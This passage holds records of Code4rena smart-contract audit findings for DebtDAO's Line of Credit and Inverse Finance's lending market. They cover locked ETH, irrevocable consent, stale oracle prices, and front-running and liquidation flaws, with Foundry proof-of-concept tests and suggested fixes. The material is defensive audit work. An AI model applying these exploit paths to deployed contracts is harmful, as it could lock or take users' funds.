Foundry  ## Recommended Mitigation Steps  This is a difficult bug to fix if the protocol still allows the lender to use this functionality. Probably should limit this functionality for the borrower to use. Because the borrower will not benefit from stealing his own money."}, {"title": "Call to declareInsolvent() would revert when contract status reaches liquidation point after repayment of credit position 1", "html_url": "https://github.com/code-423n4/2022-11-debtdao-findings/issues/69", "labels": ["bug", "3 (High Risk)", "primary issue", "satisfactory", "sponsor confirmed", "upgraded by judge", "selected for report", "edited-by-warden", "H-01"], "target": "2022-11-debtdao-findings", "body": "# Lines of code  https://github.com/debtdao/Line-of-Credit/blob/audit/code4rena-2022-11-03/contracts/modules/credit/LineOfCredit.sol#L143 https://github.com/debtdao/Line-of-Credit/blob/audit/code4rena-2022-11-03/contracts/modules/credit/LineOfCredit.sol#L83-L86   # Vulnerability details  ## Impact The modifier `whileBorrowing()` is used along in the call to LineOfCredit.declareInsolvent(). However this check reverts when count == 0 or `credits[ids[0]].principal == 0` . Within the contract, any lender can add credit which adds an entry in credits array, credits[ids].   Assume, when borrower chooses lender positions including credits[ids[0]] to draw on, and repays back the loan fully for credits[ids[1]], then the call to declareInsolvent() by the arbiter would revert since it does not pass the `whileBorrowing()` modifier check due to the ids array index shift in the call to  stepQ(), which would shift ids[1] to ids[0], thereby making the condition for `credits[ids[0]].principal == 0` be true causing the revert.    ## Proof of Concept 1. LineOfCredit contract is set up and 5 lenders have deposited into the contract. 2. Alice, the borrower borrows credit from these 5 credit positions including by calling LineOfCredit.borrow() for the position ids. 3. Later Alice pays back the loan for  credit position id 1 just before the contract gets liquidated 4. At the point where ids.stepQ() is called in _repay(), position 1 is moved to ids[0] 4. When contract status is LIQUIDATABLE, no loan drawn on credit position 0 and arbiter calls declareInsolvent() , the call would revert since `credits[ids[0]].principal == 0`  ## Tools Used Manual review  ## Recommended Mitigation Steps The modifier whileBorrowing() would need to be reviewed and amended."}, {"title": "Borrower/Lender excessive ETH not refunded and permanently locked in protocol", "html_url": "https://github.com/code-423n4/2022-11-debtdao-findings/issues/39", "labels": ["bug", "2 (Med Risk)", "downgraded by judge", "primary issue", "satisfactory", "sponsor confirmed", "selected for report", "edited-by-warden", "M-03"], "target": "2022-11-debtdao-findings", "body": "# Lines of code  https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L292 https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L315 https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L223 https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L265 https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/LineLib.sol#L71 https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L388   # Vulnerability details  ## Impact The protocol does not refund overpayment of ETH. Excessive ETH is not included in the protocols accounting as a result the funds are permanently locked in the protocol **(Loss of funds)**.  There are multiple scenarios where excessive ETH could be sent by Borrowers and Lenders to the protocol.  The vulnerability effects at least five different scenarios and locks both the lender and borrowers ETH in LineOfCredit if overpaid. **There is no way to transfer the locked ETH back to the the users**, as the withdraw methods are dependent on accounting (which is not updated with locked ETH).  This vulnerability impacts EscrowedLine, LineOfCredit, SpigotedLine and SecuredLine  ## Proof of Concept The bug resides in `receiveTokenOrETH` function when receiving ETH.   The function does not handle cases where `msg.value` is larger than `amount` meaning a refund is needed (`msg.value` - `amount`). In such cases, `msg.value` is added to the balance of LineOfCredit although only `amount` is used in internal accounting. Thus the excessive ETH  is permanently locked in the contract as the withdraw methods are dependent on the internal accounting.  https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/LineLib.sol#L59 ```   function receiveTokenOrETH(       address token,       address sender,       uint256 amount     )       external       returns (bool)     {         if(token == address(0)) { revert TransferFailed(); }         if(token != Denominations.ETH) { // ERC20             IERC20(token).safeTransferFrom(sender, address(this), amount);         } else { // ETH             if(msg.value < amount) { revert TransferFailed(); }         }         return true;     } ```  Scenarios where borrowers ETH funds will be locked in LineOfCredit:  1. Borrower calls `depositAndClose` with an ETH value that is above the owed debt. 2. Borrower calls `depositAndRepay` with an ETH value that is above the amount specified in the parameters. 3. Borrower calls `close` with an ETH value that is above the owed fees.  Scenarios where lenders ETH funds will be locked in LineOfCredit: 1. Lender calls `addCredit` with and ETH value that is greater than the `amount` parameter. 2. Lender calls `increaseCredit` with and ETH value that is greater than the `amount` parameter.  The above scenarios will happen when:  * Excessive ETH is sent with the confidence that it will be refunded (expected). Intentionally or by mistake. * Excessive ETH will be sent (and expected to be refunded) when calling `depositeAndClose()`, `close(id)` and `depositAndRepay(amount)` as they internally update the fees with the `_accrue` method. The amount changes every second because part of the formula that calculates the fees is based on a multiplication of seconds past the previous calculations. In most cases, the caller will not know the amount of interest that will be accrued and must send excessive ETH to not revert the transaction.     * The formula that calculates interest:  `InterestAccrued = (rate.dRate * drawnBalance * timespan) / INTEREST_DENOMINATOR +  (rate.fRate * (facilityBalance - drawnBalance) * timespan) / INTEREST_DENOMINATOR ` Where `timespan` is `timespan= block.timestamp - rate.lastAccrued`     * Attached link to Debt DAO docs with more information: https://docs.debtdao.finance/faq/accrued-interest-calculation  The POC includes four of the mentioned scenarios. To run the POC add the below code to the LineOfCredit.t.sol test and execute `forge test -v`. Expected output: ``` Running 4 tests for contracts/tests/LineOfCredit.t.sol:LineTest [PASS] test_freeze_eth_addCredit() (gas: 277920) [PASS] test_freeze_eth_depositAndClose() (gas: 280378) [PASS] test_freeze_eth_depositAndRepay() (gas: 302991) [PASS] test_freeze_eth_increaseCredit() (gas: 318830) Test result: ok. 4 passed; 0 failed; finished in 1.59ms ``` Add the following code to tests: ```     function _addCreditEth(address token, uint256 amount) internal {         vm.prank(borrower);         line.addCredit(dRate, fRate, amount, token, lender);         vm.stopPrank();         vm.prank(lender);         line.addCredit{value: amount}(dRate, fRate, amount, token, lender);         vm.stopPrank();     }     function test_freeze_eth_depositAndClose() public {         uint256 amount = 1 ether;         address eth = address(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE);          // fund lender         deal(lender, amount*5);         // fund borrower         deal(borrower, amount*5);          // add credit to line         _addCreditEth(eth, amount);          //borrow 1 ether         bytes32 id = line.ids(0);         vm.startPrank(borrower);         line.borrow(id, amount);         vm.stopPrank();                  //depositAndClose full extra funds (amount * 2)         vm.startPrank(borrower);         line.depositAndClose{value:amount*2}();         vm.stopPrank();          //validate funds are stuck         console.log(address(line).balance);         assert(address(line).balance == amount*2 - amount);     }       function test_freeze_eth_depositAndRepay() public {         uint256 amount = 1 ether;         address eth = address(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE);          // fund lender         deal(lender, amount*5);         // fund borrower         deal(borrower, amount*5);          // add credit to line         _addCreditEth(eth, amount);          //borrow 1 ether         bytes32 id = line.ids(0);         vm.startPrank(borrower);         line.borrow(id, amount);         vm.stopPrank();                  //depositAndRepay full extra funds (amount * 2)         vm.startPrank(borrower);         line.depositAndRepay{value:amount*2}(amount);         vm.stopPrank();           // Lender calls withdraw          vm.startPrank(lender);         line.withdraw(id, amount);         vm.stopPrank();          //validate funds are stuck         assert(address(line).balance == amount*2 - amount);     }      function test_freeze_eth_addCredit() public {         uint256 amount = 1 ether;         address eth = address(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE);          // fund lender         deal(lender, amount*5);         // fund borrower         deal(borrower, amount*5);          // add credit to line         vm.prank(borrower);         line.addCredit(dRate, fRate, amount, eth, lender);         vm.stopPrank();         vm.prank(lender);         //double msg.value then amount         line.addCredit{value: amount*2}(dRate, fRate, amount, eth, lender);         vm.stopPrank();          //borrow 1 ether         bytes32 id = line.ids(0);         vm.startPrank(borrower);         line.borrow(id, amount);         vm.stopPrank();                  //depositAndClose full extra funds (amount)         vm.startPrank(borrower);         line.depositAndClose{value:amount}();         vm.stopPrank();          //validate funds are stuck         assert(address(line).balance == amount*2 - amount);     }      function test_freeze_eth_increaseCredit() public {         uint256 amount = 1 ether;         address eth = address(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE);          // fund lender         deal(lender, amount*5);         // fund borrower         deal(borrower, amount*5);          // add credit to line         _addCreditEth(eth, amount);                  // get id         bytes32 id = line.ids(0);          // increase credit to line         vm.prank(borrower);         line.increaseCredit(id, amount);         vm.stopPrank();         vm.prank(lender);         //double msg.value then amount         line.increaseCredit{value:amount*2}(id, amount);         vm.stopPrank();          //total amount * 3 in contract          //borrow 2 ether         vm.startPrank(borrower);         line.borrow(id, amount * 2);         vm.stopPrank();                  //depositAndClose full extra funds (amount)         vm.startPrank(borrower);         line.depositAndClose{value:amount*2}();         vm.stopPrank();          //validate funds are stuck         assert(address(line).balance == amount*3 - amount*2);     } ```  The POC demonstrates how Borrower and Lender funds get locked in the protocol.  ## Tools Used  VS Code, Foundry  ## Recommended Mitigation Steps Options: 1. refund - in receiveTokenOrETH, refund tokens back to `msg.sender `if `msg.value > amount` 2. revert - change the expression `if(msg.value < amount)` to `if(msg.value != amount)` and revert the transaction."}, {"title": "Mutual consent cannot be revoked and stays valid forever", "html_url": "https://github.com/code-423n4/2022-11-debtdao-findings/issues/33", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "sponsor confirmed", "selected for report", "M-02"], "target": "2022-11-debtdao-findings", "body": "# Lines of code  https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/MutualConsent.sol#L11-L68 https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L247-L262   # Vulnerability details  ## Impact Contracts that inherit from the `MutualConsent` contract, have access to a `mutualConsent` modifier.   Functions that use this modifier need consent from two parties to be called successfully.    Once one party has given consent for a function call, it cannot revoke consent.   This means that the other party can call this function at any time now.    This opens the door for several exploitation paths.   Most notably though the functions `LineOfCredit.setRates()`, `LineOfCredit.addCredit()` and `LineOfCredit.increaseCredit()` can cause problems.    One party can use Social Engineering to make the other party consent to multiple function calls and exploit the multiple consents.    ## Proof of Concept 1. A borrower and lender want to change the rates for a credit.      The borrower wants to create the possibility for himself to change the rates in the future without the lender's consent.   2. The borrower and lender agree to set `dRate` and `fRate` to 5%. 3. The lender calls the `LineOfCredit.setRates()` function to give his consent. 4. The borrower might now say to the lender \"Let's put the rate to 5.1% instead, I will give an extra 0.1%\" 5. The borrower and lender now both call the `LineOfCredit.setRates()` function to set the rates to 5.1%. 6. The borrower can now set the rates to 5% at any time. E.g. they might increase the rates further in the future (the borrower playing by the rules)      and at some point the borrower can decide to set the rates to 5%.  Links:   `MutualConsent` contract: [https://github.com/debtdao/Line-of-Credit/blob/audit/code4rena-2022-11-03/contracts/utils/MutualConsent.sol](https://github.com/debtdao/Line-of-Credit/blob/audit/code4rena-2022-11-03/contracts/utils/MutualConsent.sol)    `LineOfCredit.setRates()` function: [https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L247-L262](https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L247-L262)   ## Tools Used VSCode  ## Recommended Mitigation Steps There are several options to fix this issue: 1. Add a function to the `MutualConsent` contract to revoke consent for a function call. 2. Make consent valid only for a certain amount of time. 3. Invalidate existing consents for a function when function is called with different arguments.  Option 3 requires a lot of additional bookkeeping but is probably the cleanest solution."}, {"title": "Borrower can by mistake add own money to credit if credit is in ETH", "html_url": "https://github.com/code-423n4/2022-11-debtdao-findings/issues/24", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "sponsor confirmed", "selected for report", "M-01"], "target": "2022-11-debtdao-findings", "body": "# Lines of code  https://github.com/debtdao/Line-of-Credit/blob/audit/code4rena-2022-11-03/contracts/modules/credit/LineOfCredit.sol#L223-L244 https://github.com/debtdao/Line-of-Credit/blob/audit/code4rena-2022-11-03/contracts/utils/LineLib.sol#L59-L74   # Vulnerability details  ## Impact Borrower can by mistake add own money to credit if credit is in ETH.  ## Proof of Concept Function `LineOfCredit.addCredit` is used to create new credit. It can be called only after contest of another party. ```solidity     function addCredit(         uint128 drate,         uint128 frate,         uint256 amount,         address token,         address lender     )         external         payable         override         whileActive         mutualConsent(lender, borrower)         returns (bytes32)     {         LineLib.receiveTokenOrETH(token, lender, amount);           bytes32 id = _createCredit(lender, token, amount);           require(interestRate.setRate(id, drate, frate));                  return id;     } ``` `LineLib.receiveTokenOrETH(token, lender, amount)` is responsible for getting payment. https://github.com/debtdao/Line-of-Credit/blob/audit/code4rena-2022-11-03/contracts/utils/LineLib.sol#L59-L74 ```solidity     function receiveTokenOrETH(       address token,       address sender,       uint256 amount     )       external       returns (bool)     {         if(token == address(0)) { revert TransferFailed(); }         if(token != Denominations.ETH) { // ERC20             IERC20(token).safeTransferFrom(sender, address(this), amount);         } else { // ETH             if(msg.value < amount) { revert TransferFailed(); }         }         return true;     } ``` As you can see in case of native token payment, `sender` is not checked to be `msg.sender`, so this makes it's possible that borrower can by mistake pay instead of lender. It sounds funny, but it's possible. What is needed is that lender call `addCredit` first and then borrower calls `addCredit` and provides value.  ## Tools Used VsCode ## Recommended Mitigation Steps Check that if payment in ETH then `lender == msg.sender` in `addCredit` function."}, {"title": "Chainlink oracle data feed is not sufficiently validated and can return stale `price`", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/584", "labels": ["bug", "2 (Med Risk)", "primary issue", "sponsor confirmed", "selected for report", "M-17"], "target": "2022-10-inverse-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-10-inverse/blob/main/src/Oracle.sol#L78-L105 https://github.com/code-423n4/2022-10-inverse/blob/main/src/Oracle.sol#L112-L144 https://github.com/code-423n4/2022-10-inverse/blob/main/src/Market.sol#L344-L347 https://github.com/code-423n4/2022-10-inverse/blob/main/src/Market.sol#L323-L327 https://github.com/code-423n4/2022-10-inverse/blob/main/src/Market.sol#L353-L363   # Vulnerability details  ## Impact Calling the `Oracle` contract's `viewPrice` or `getPrice` function executes `uint price = feeds[token].feed.latestAnswer()` and `require(price > 0, \"Invalid feed price\")`. Besides that Chainlink's `latestAnswer` function is deprecated, only verifying that `price > 0` is true is also not enough to guarantee that the returned `price` is not stale. Using a stale `price` can cause the calculations for the credit and withdrawal limits to be inaccurate, which, for example, can mistakenly consider a user's debt to be under water and unexpectedly allow the user's debt to be liquidated.  To avoid using a stale answer returned by the Chainlink oracle data feed, according to [Chainlink's documentation](https://docs.chain.link/docs/historical-price-data): 1. The `latestRoundData` function can be used instead of the deprecated `latestAnswer` function. 2. `roundId` and `answeredInRound` are also returned. \"You can check `answeredInRound` against the current `roundId`. If `answeredInRound` is less than `roundId`, the answer is being carried over. If `answeredInRound` is equal to `roundId`, then the answer is fresh.\" 3. \"A read can revert if the caller is requesting the details of a round that was invalid or has not yet been answered. If you are deriving a round ID without having observed it before, the round might not be complete. To check the round, validate that the timestamp on that round is not 0.\"    https://github.com/code-423n4/2022-10-inverse/blob/main/src/Oracle.sol#L78-L105 ```solidity     function viewPrice(address token, uint collateralFactorBps) external view returns (uint) {         if(fixedPrices[token] > 0) return fixedPrices[token];         if(feeds[token].feed != IChainlinkFeed(address(0))) {             // get price from feed             uint price = feeds[token].feed.latestAnswer();             require(price > 0, \"Invalid feed price\");             // normalize price             uint8 feedDecimals = feeds[token].feed.decimals();             uint8 tokenDecimals = feeds[token].tokenDecimals;             uint8 decimals = 36 - feedDecimals - tokenDecimals;             uint normalizedPrice = price * (10 ** decimals);             uint day = block.timestamp / 1 days;             // get today's low             uint todaysLow = dailyLows[token][day];             // get yesterday's low             uint yesterdaysLow = dailyLows[token][day - 1];             // calculate new borrowing power based on collateral factor             uint newBorrowingPower = normalizedPrice * collateralFactorBps / 10000;             uint twoDayLow = todaysLow > yesterdaysLow && yesterdaysLow > 0 ? yesterdaysLow : todaysLow;             if(twoDayLow > 0 && newBorrowingPower > twoDayLow) {                 uint dampenedPrice = twoDayLow * 10000 / collateralFactorBps;                 return dampenedPrice < normalizedPrice ? dampenedPrice: normalizedPrice;             }             return normalizedPrice;          }         revert(\"Price not found\");     } ```  https://github.com/code-423n4/2022-10-inverse/blob/main/src/Oracle.sol#L112-L144 ```solidity     function getPrice(address token, uint collateralFactorBps) external returns (uint) {         if(fixedPrices[token] > 0) return fixedPrices[token];         if(feeds[token].feed != IChainlinkFeed(address(0))) {             // get price from feed             uint price = feeds[token].feed.latestAnswer();             require(price > 0, \"Invalid feed price\");             // normalize price             uint8 feedDecimals = feeds[token].feed.decimals();             uint8 tokenDecimals = feeds[token].tokenDecimals;             uint8 decimals = 36 - feedDecimals - tokenDecimals;             uint normalizedPrice = price * (10 ** decimals);             // potentially store price as today's low             uint day = block.timestamp / 1 days;             uint todaysLow = dailyLows[token][day];             if(todaysLow == 0 || normalizedPrice < todaysLow) {                 dailyLows[token][day] = normalizedPrice;                 todaysLow = normalizedPrice;                 emit RecordDailyLow(token, normalizedPrice);             }             // get yesterday's low             uint yesterdaysLow = dailyLows[token][day - 1];             // calculate new borrowing power based on collateral factor             uint newBorrowingPower = normalizedPrice * collateralFactorBps / 10000;             uint twoDayLow = todaysLow > yesterdaysLow && yesterdaysLow > 0 ? yesterdaysLow : todaysLow;             if(twoDayLow > 0 && newBorrowingPower > twoDayLow) {                 uint dampenedPrice = twoDayLow * 10000 / collateralFactorBps;                 return dampenedPrice < normalizedPrice ? dampenedPrice: normalizedPrice;             }             return normalizedPrice;          }         revert(\"Price not found\");     } ```  https://github.com/code-423n4/2022-10-inverse/blob/main/src/Market.sol#L344-L347 ```solidity     function getCreditLimitInternal(address user) internal returns (uint) {         uint collateralValue = getCollateralValueInternal(user);         return collateralValue * collateralFactorBps / 10000;     } ```  https://github.com/code-423n4/2022-10-inverse/blob/main/src/Market.sol#L323-L327 ```solidity     function getCollateralValueInternal(address user) internal returns (uint) {         IEscrow escrow = predictEscrow(user);         uint collateralBalance = escrow.balance();         return collateralBalance * oracle.getPrice(address(collateral), collateralFactorBps) / 1 ether;     } ```  https://github.com/code-423n4/2022-10-inverse/blob/main/src/Market.sol#L353-L363 ```solidity     function getWithdrawalLimitInternal(address user) internal returns (uint) {         IEscrow escrow = predictEscrow(user);         uint collateralBalance = escrow.balance();         if(collateralBalance == 0) return 0;         uint debt = debts[user];         if(debt == 0) return collateralBalance;         if(collateralFactorBps == 0) return 0;         uint minimumCollateral = debt * 1 ether / oracle.getPrice(address(collateral), collateralFactorBps) * 10000 / collateralFactorBps;         if(collateralBalance <= minimumCollateral) return 0;         return collateralBalance - minimumCollateral;     } ```  ## Proof of Concept The following steps can occur for the described scenario. 1. Alice calls the `depositAndBorrow` function to deposit some WETH as the collateral and borrows some DOLA against the collateral. 2. Bob calls the `liquidate` function for trying to liquidate Alice's debt. Because the Chainlink oracle data feed returns an up-to-date price at this moment, the `getCreditLimitInternal` function calculates Alice's credit limit accurately, which does not cause Alice's debt to be under water. Hence, Bob's `liquidate` transaction reverts. 3. After some time, Bob calls the `liquidate` function again for trying to liquidate Alice's debt. This time, because the Chainlink oracle data feed returns a positive but stale price, the `getCreditLimitInternal` function calculates Alice's credit limit inaccurately, which mistakenly causes Alice's debt to be under water. 4. Bob's `liquidate` transaction is executed successfully so he gains some of Alice's WETH collateral. Alice loses such WETH collateral amount unexpectedly because her debt should not be considered as under water if the stale price was not used.  ## Tools Used VSCode  ## Recommended Mitigation Steps https://github.com/code-423n4/2022-10-inverse/blob/main/src/Oracle.sol#L82-L83 and https://github.com/code-423n4/2022-10-inverse/blob/main/src/Oracle.sol#L116-L117 can be updated to the following code. ```solidity             (uint80 roundId, int256 answer, , uint256 updatedAt, uint80 answeredInRound) = feeds[token].feed.latestRoundData();             require(answeredInRound >= roundId, \"answer is stale\");             require(updatedAt > 0, \"round is incomplete\");             require(answer > 0, \"Invalid feed answer\");              uint256 price = uint256(answer); ```"}, {"title": "Oracle assumes token and feed decimals will be limited to 18 decimals", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/533", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "sponsor confirmed", "selected for report", "M-15"], "target": "2022-10-inverse-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-10-inverse/blob/main/src/Oracle.sol#L87 https://github.com/code-423n4/2022-10-inverse/blob/main/src/Oracle.sol#L121   # Vulnerability details  ## Impact  The `Oracle` contract normalizes prices in both `viewPrices` and `getPrices` functions to adjust for potential decimal differences between feed and token decimals and the expected return value.   However these functions assume that `feedDecimals` and `tokenDecimals` won't exceed 18 since the normalization calculation is `36 - feedDecimals - tokenDecimals`, or that at worst case the sum of both won't exceed 36.  This assumption should be safe for certain cases, for example WETH is 18 decimals and the ETH/USD chainlink is 8 decimals, but may cause an overflow (and a revert) for the general case, rendering the Oracle useless in these cases.  ## Proof of Concept  If `feedDecimals + tokenDecimals > 36` then the expression `36 - feedDecimals - tokenDecimals` will be negative and (due to Solidity 0.8 default checked math) will cause a revert.  ## Recommended Mitigation Steps  In case `feedDecimals + tokenDecimals` exceeds 36, then the proper normalization procedure would be to **divide** the price by `10 ** decimals`. Something like this:  ``` uint normalizedPrice;  if (feedDecimals + tokenDecimals > 36) {     uint decimals = feedDecimals + tokenDecimals - 36;     normalizedPrice = price / (10 ** decimals) } else {     uint8 decimals = 36 - feedDecimals - tokenDecimals;     normalizedPrice = price * (10 ** decimals); } ```"}, {"title": "`Market::forceReplenish` can be DoSed", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/443", "labels": ["bug", "2 (Med Risk)", "satisfactory", "sponsor confirmed", "selected for report", "M-13"], "target": "2022-10-inverse-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-10-inverse/blob/main/src/Market.sol#L562   # Vulnerability details  ## Impact If a user wants to completely forceReplenish a borrower with deficit, the borrower or any other malicious party can front run this with a dust amount to prevent the replenish.  ## Proof of Concept ```javascript     function testForceReplenishFrontRun() public {         gibWeth(user, wethTestAmount);         gibDBR(user, wethTestAmount / 14);         uint initialReplenisherDola = DOLA.balanceOf(replenisher);          vm.startPrank(user);         deposit(wethTestAmount);         uint borrowAmount = getMaxBorrowAmount(wethTestAmount);         market.borrow(borrowAmount);         uint initialUserDebt = market.debts(user);         uint initialMarketDola = DOLA.balanceOf(address(market));         vm.stopPrank();          vm.warp(block.timestamp + 5 days);         uint deficitBefore = dbr.deficitOf(user);         vm.startPrank(replenisher);          market.forceReplenish(user,1); // front run DoS          vm.expectRevert(\"Amount > deficit\");         market.forceReplenish(user, deficitBefore); // fails due to amount being larger than deficit                  assertEq(DOLA.balanceOf(replenisher), initialReplenisherDola, \"DOLA balance of replenisher changed\");         assertEq(DOLA.balanceOf(address(market)), initialMarketDola, \"DOLA balance of market changed\");         assertEq(DOLA.balanceOf(replenisher) - initialReplenisherDola, initialMarketDola - DOLA.balanceOf(address(market)),             \"DOLA balance of market did not decrease by amount paid to replenisher\");         assertEq(dbr.deficitOf(user), deficitBefore-1, \"Deficit of borrower was not fully replenished\");          // debt only increased by dust         assertEq(market.debts(user) - initialUserDebt, 1 * replenishmentPriceBps / 10000, \"Debt of borrower did not increase by replenishment price\");     } ``` This requires that the two txs end up in the same block. If they end up in different blocks the front run transaction will need to account for the increase in deficit between blocks.   ## Tools Used vscode, forge  ## Recommended Mitigation Steps Use `min(deficit,amount)` as amount to replenish "}, {"title": " Users could get some `DOLA` even if their are on liquidation position", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/419", "labels": ["bug", "2 (Med Risk)", "satisfactory", "sponsor confirmed", "selected for report", "M-12"], "target": "2022-10-inverse-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-10-inverse/blob/main/src/Market.sol#L566   # Vulnerability details  ## Impact Users abels to invoke `forceReplenish()` when they are on liquidation position  ## Proof of Concept On `Market.sol` ==>  `forceReplenish()` On this line  ``` uint collateralValue = getCollateralValueInternal(user); ```  `getCollateralValueInternal(user)` only return the value of the collateral  ```     function getCollateralValueInternal(address user) internal returns (uint) {         IEscrow escrow = predictEscrow(user);         uint collateralBalance = escrow.balance();         return collateralBalance * oracle.getPrice(address(collateral), collateralFactorBps) / 1 ether;  ``` So if the user have 1.5 wETH at the price of  1 ETH = 1600 USD It will return `1.5 * 1600` and this value is the real value we can\u2019t just check it directly with the debt like this  ```  require(collateralValue >= debts[user], \"Exceeded collateral value\"); ``` This is no longer `over collateralized` protocol  The value needs to be multiplied by `collateralFactorBps / 10000` -  So depending on the value of `collateralFactorBps` and `liquidationFactorBps` the user could be in the liquidation position but he is able to invoke `forceReplenish()` to cover all their `dueTokensAccrued[user]` on `DBR.sol` and get more `DOLA` -  or it will lead a healthy debt to be in the liquidation position after invoking `forceReplenish()` -   ## Recommended Mitigation Steps Use `getCreditLimitInternal()` rather than `getCollateralValueInternal()`.  "}, {"title": "`viewPrice` doesn't always report dampened price", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/404", "labels": ["bug", "2 (Med Risk)", "satisfactory", "sponsor confirmed", "selected for report", "M-11"], "target": "2022-10-inverse-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-10-inverse/blob/3e81f0f5908ea99b36e6ab72f13488bbfe622183/src/Oracle.sol#L91   # Vulnerability details  ## Impact Oracle's `viewPrice` function doesn't report a dampened price until `getPrice` is called and today's price is updated. This will impact the public read-only functions that call it: - [getCollateralValue](https://github.com/code-423n4/2022-10-inverse/blob/3e81f0f5908ea99b36e6ab72f13488bbfe622183/src/Market.sol#L312); - [getCreditLimit](https://github.com/code-423n4/2022-10-inverse/blob/3e81f0f5908ea99b36e6ab72f13488bbfe622183/src/Market.sol#L334) (calls `getCollateralValue`); - [getLiquidatableDebt](https://github.com/code-423n4/2022-10-inverse/blob/3e81f0f5908ea99b36e6ab72f13488bbfe622183/src/Market.sol#L578) (calls `getCreditLimit`); - [getWithdrawalLimit](https://github.com/code-423n4/2022-10-inverse/blob/3e81f0f5908ea99b36e6ab72f13488bbfe622183/src/Market.sol#L370).  These functions are used to get on-chain state and prepare values for write calls (e.g. calculate withdrawal amount before withdrawing or calculate a user's debt that can be liquidated before liquidating it). Thus, wrong values returned by these functions can cause withdrawal of a wrong amount or liquidation of a wrong debt or cause reverts. ## Proof of Concept ```solidity // src/test/Oracle.t.sol function test_viewPriceNoDampenedPrice_AUDIT() public {     uint collateralFactor = market.collateralFactorBps();     uint day = block.timestamp / 1 days;     uint feedPrice = ethFeed.latestAnswer();      //1600e18 price saved as daily low     oracle.getPrice(address(WETH), collateralFactor);     assertEq(oracle.dailyLows(address(WETH), day), feedPrice);      vm.warp(block.timestamp + 1 days);     uint newPrice = 1200e18;     ethFeed.changeAnswer(newPrice);     //1200e18 price saved as daily low     oracle.getPrice(address(WETH), collateralFactor);     assertEq(oracle.dailyLows(address(WETH), ++day), newPrice);      vm.warp(block.timestamp + 1 days);     newPrice = 3000e18;     ethFeed.changeAnswer(newPrice);      //1200e18 should be twoDayLow, 3000e18 is current price. We should receive dampened price here.     // Notice that viewPrice is called before getPrice.     uint viewPrice = oracle.viewPrice(address(WETH), collateralFactor);     uint price = oracle.getPrice(address(WETH), collateralFactor);     assertEq(oracle.dailyLows(address(WETH), ++day), newPrice);      assertEq(price, 1200e18 * 10_000 / collateralFactor);      // View price wasn't dampened.     assertEq(viewPrice, 3000e18); } ``` ## Tools Used Manual review ## Recommended Mitigation Steps Consider this change: ```diff --- a/src/Oracle.sol +++ b/src/Oracle.sol @@ -89,6 +89,9 @@ contract Oracle {              uint day = block.timestamp / 1 days;              // get today's low              uint todaysLow = dailyLows[token][day]; +            if(todaysLow == 0 || normalizedPrice < todaysLow) { +                todaysLow = normalizedPrice; +            }              // get yesterday's low              uint yesterdaysLow = dailyLows[token][day - 1];              // calculate new borrowing power based on collateral factor ```"}, {"title": "Liquidation should make a borrower _healthier_", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/395", "labels": ["bug", "2 (Med Risk)", "downgraded by judge", "satisfactory", "sponsor confirmed", "selected for report", "M-10"], "target": "2022-10-inverse-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-10-inverse/blob/main/src/Market.sol#L559 https://github.com/code-423n4/2022-10-inverse/blob/main/src/Market.sol#L591   # Vulnerability details  ## Impact  For a lending pool, borrower's debt healthness can be decided by the health factor, i.e. the collateral value divided by debt. ($C/D$)  The less the health factor is, the borrower's collateral is more risky of being liquidated.  Liquidation is supposed to make the borrower healthier (by paying debts and claiming some collateral), or else continuous liquidations can follow up and this can lead to a so-called [liquidation crisis](https://medium.com/coinmonks/what-is-liquidation-in-defi-lending-and-borrowing-platforms-3326e0ba8d0).  In a normal lending protocol, borrower's debt is limited by collateral factor in any case.  For this protocol, users can force replenishment for the addresses in deficit and the replenishment increases the borrower's debt.  And in the current implementation the replenishment is limited so that the new debt is not over than the collateral value.  As we will see below, this limitation is not enough and if the borrower's debt is over some threshold (still less than collateral value), liquidation makes the borrower debt \"unhealthier\".  And repeating liquidation can lead to various problems and we will even show an example that the attacker can take the DOLA out of the market.  ## Proof of Concept  ### Terminology  $C_f$ - collateralFactorBps / 10000  $L_i$ - liquidationIncentiveBps / 10000  